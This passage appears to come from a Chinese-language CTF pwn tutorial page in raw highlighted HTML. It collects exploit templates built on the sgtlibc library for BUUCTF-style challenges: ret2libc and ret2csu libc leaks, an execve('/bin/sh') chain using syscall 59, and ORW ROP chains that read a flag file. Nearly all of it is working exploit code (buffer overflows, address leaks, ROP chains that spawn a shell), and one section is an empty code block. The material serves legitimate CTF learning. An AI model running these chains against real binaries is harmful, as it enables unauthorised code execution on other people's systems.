    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload_exp <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># overflow position</span>
    payload_exp <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> payload_exp

main_addr <span class="token operator">=</span> <span class="token number">0x04006D2</span>  <span class="token comment"># elf.symbols['main']</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>warning<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">,</span>
               elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>main_addr<span class="token punctuation">]</span>
    sla<span class="token punctuation">(</span><span class="token string">'EASY PWN PWN PWN~'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

    <span class="token comment"># ru('input:\n')</span>
    interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># ru(fakeebp())  # 如果有输出则清空缓存</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> u00<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak {func}:{hex(data)}'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
<span class="token comment"># leak('printf')</span>
leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
<span class="token comment"># leak('stdout')</span>
<span class="token comment"># leak('stdin')</span>
leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>


<span class="token comment"># 如果给了libc则可以直接使用</span>
<span class="token comment"># libc = ELF('libc_buu-2.23_x64.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>

data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># choose your system index</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span>  <span class="token comment"># sometime maybe wrong</span>
payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>ret_addr<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">,</span> system_addr<span class="token punctuation">]</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="libcleak_x64_write_428"></a>libc-leak_x64_write</h4> 
<p>例题:<a href="https://buuoj.cn/challenges#jarvisoj_level3_x64" rel="nofollow">buuctf level3_x64</a></p> 
<pre><code class="prism language-python">
</code></pre> 
<h4><a id="retcsu_x64_leak_libc_436"></a>retcsu_x64_leak_libc</h4> 
<p>例题:<a href="%E5%BF%98%E4%BA%86%E5%93%AA%E4%B8%80%E9%A2%98%E4%BA%86" rel="nofollow">pwnthebox ret2libc_64</a></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ret2libc_64'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># write(1,buffer,8)</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rsi_r15'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># csu必然有</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdx'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>main_addr<span class="token punctuation">]</span>
    <span class="token comment"># 如果是read的话则sa，如果是gets scanf的话则sl</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak {func}:{data}'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> u00<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
<span class="token comment"># leak('printf')</span>
leak<span class="token punctuation">(</span><span class="token string">'gets'</span><span class="token punctuation">)</span>
<span class="token comment"># leak('stdout')</span>
<span class="token comment"># leak('stdin')</span>
leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>

<span class="token comment"># 如果给了libc则可以直接使用</span>
<span class="token comment"># libc = ELF('libc_buu-2.23_x64.so', checksec=False)</span>
<span class="token comment"># offset = addr - libc.symbols['__libc_start_main']</span>
<span class="token comment"># system_addr = libc.symbols['system'] + offset</span>
<span class="token comment"># binsh_addr = next(libc.search(b'/bin/sh')) + offset</span>

data <span class="token operator">=</span> s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># choose your system index</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>system_addr<span class="token punctuation">]</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="retcsu_x64_with_syscall59_517"></a>retcsu_x64_with_syscall59</h4> 
<p>例题:<a href="https://buuoj.cn/challenges#ciscn_2019_s_3" rel="nofollow">buuctf ciscn_s_3</a></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ciscn_s_3'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>

s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
csu_init_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_csu_init'</span><span class="token punctuation">]</span>

rax_59_ret <span class="token operator">=</span> <span class="token number">0x04004E2</span>
syscall <span class="token operator">=</span> <span class="token number">0x0400517</span>
payload <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">]</span>
<span class="token comment"># gdb.attach(client.client, 'b 0x0400501')</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
rc<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>  <span class="token comment"># buf size</span>
stack_addr <span class="token operator">=</span> u00<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># leak current ebp</span>

<span class="token comment"># binsh_addr = stack_addr - 0x138  # 线上则是0x138 # esp - ebp</span>
binsh_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x148</span>  <span class="token comment"># 本地运行需要 -0x148</span>
rax_59 <span class="token operator">=</span> binsh_addr <span class="token operator">+</span> <span class="token number">0x10</span>
pop_rdi <span class="token operator">=</span> <span class="token number">0x04005a3</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'stack_addr:{hex(stack_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'rax_59:{hex(rax_59)}'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rax_59_ret<span class="token punctuation">]</span>
d <span class="token operator">=</span> gadgets<span class="token punctuation">.</span>gadget_by_csu<span class="token punctuation">(</span>
    libc_csu_init_address<span class="token operator">=</span>csu_init_addr<span class="token punctuation">,</span>
    func_to_call<span class="token operator">=</span>rax_59<span class="token punctuation">,</span>
    param1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    param2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    param3<span class="token operator">=</span><span class="token number">0</span>
<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>gadgets<span class="token punctuation">.</span>build<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># set rax to 59</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>pop_rdi<span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>syscall<span class="token punctuation">]</span>
<span class="token comment"># syscall_59 (binsh)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="orwx64puts_by_func_578"></a>orw-x64-puts by_func</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ret2dlresolve'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>

s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span>

libc_path <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libseccomp.so.2'</span>
flag_path <span class="token operator">=</span> <span class="token string">'./flag\x00\x00'</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x601800</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
file_description <span class="token operator">=</span> <span class="token number">3</span>  <span class="token comment"># 需要根据当前fd值修改</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data




<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>warning<span class="token punctuation">(</span>f<span class="token string">'start leak {func}'</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">,</span>
               elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>main_addr<span class="token punctuation">]</span>
    sa<span class="token punctuation">(</span>b<span class="token string">'welcome\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token comment"># ru('input:\n')</span>
    <span class="token comment"># ru(fakeebp())  # 如果有输出则清空缓存</span>
    data <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\0'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> u00<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak {func}:{hex(data)}'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span>func<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data


<span class="token comment"># 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确</span>
addr <span class="token operator">=</span> leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets<span class="token punctuation">.</span>ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>get_rop<span class="token punctuation">(</span><span class="token punctuation">)</span>

puts_libc_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
offset <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
open_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span> <span class="token operator">+</span> offset
write_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> offset
success<span class="token punctuation">(</span>f<span class="token string">'write_addr:{hex(write_addr)}'</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span>f<span class="token string">'open_addr:{hex(open_addr)}'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exp_control_rdirsirdx</span><span class="token punctuation">(</span>rdi<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> rsi<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> rdx<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> r15<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdi'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rdi<span class="token punctuation">]</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rsi_r15'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rsi<span class="token punctuation">,</span> r15<span class="token punctuation">]</span>  <span class="token comment"># csu必然有</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>libc<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'rdx'</span><span class="token punctuation">]</span> <span class="token operator">+</span> offset<span class="token punctuation">,</span> rdx<span class="token punctuation">]</span>
    <span class="token keyword">return</span> payload


payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 写入flag字符串到bss</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag_path<span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># 打开flag文件</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span>bss_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>open_addr<span class="token punctuation">]</span>

<span class="token comment"># 读取flag内容</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span>file_description<span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># 打印flag</span>
payload <span class="token operator">+=</span> exp_control_rdirsirdx<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>write_addr<span class="token punctuation">]</span>

se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
se<span class="token punctuation">(</span>flag_path<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="orwx64puts_by_syscall_680"></a>orw-x64-puts by_syscall</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ret2dlresolve'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
